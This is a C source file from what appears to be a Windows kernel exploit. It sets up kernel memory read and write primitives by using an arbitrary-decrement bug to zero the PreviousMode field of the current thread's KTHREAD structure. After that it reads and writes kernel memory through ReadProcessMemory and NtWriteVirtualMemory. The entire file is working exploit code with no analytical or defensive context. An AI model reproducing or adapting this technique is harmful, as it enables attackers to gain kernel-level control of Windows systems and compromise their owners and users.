#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <cstdint>

#include "primitives/arbitrary_write.h"

#include "primitives/arbitrary_read.h"
#include "primitives/arbitrary_decrement.h"
#include "windows_api/windows_api.h"

int SetupArbitraryWrite(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
{
    // Target PreviousMode field of KTHREAD structure
    uintptr_t addr_to_decrement = addrs->self_kthread + KTHREAD_PREVIOUS_MODE_OFFSET;

    puts("[*] Executing arbitrary decrement to modify PreviousMode");
    if (!ArbitraryDecrement(pipes, addrs, addr_to_decrement))
    {
        fprintf(stderr, "[-] Failed to trigger arbitrary decrement\n");
        return 0;
    }

    return 1;
}

uintptr_t Read64(uintptr_t address)
{
    // Read 8 bytes from kernel memory (possible due to PreviousMode being 0)
    uintptr_t read_qword;
    SIZE_T read_bytes;

    if (!ReadProcessMemory(GetCurrentProcess(), (LPVOID)(address), (LPVOID)&read_qword, sizeof(uintptr_t), &read_bytes))
    {
        fprintf(stderr, "[-] ReadProcessMemory failed. Error code: %d\n", GetLastError());
    }

    return read_qword;
}

NTSTATUS Write64(uintptr_t address, uintptr_t value)
{
    // Write 8 bytes to kernel memory (possible due to PreviousMode being 0)
    return NtWriteVirtualMemory_(GetCurrentProcess(), (LPVOID)address, &value, sizeof(uintptr_t), NULL);
}

NTSTATUS ArbitraryWrite(uintptr_t address, char* value, size_t size)
{
    return NtWriteVirtualMemory_(GetCurrentProcess(), (LPVOID)address, value, size, NULL);
}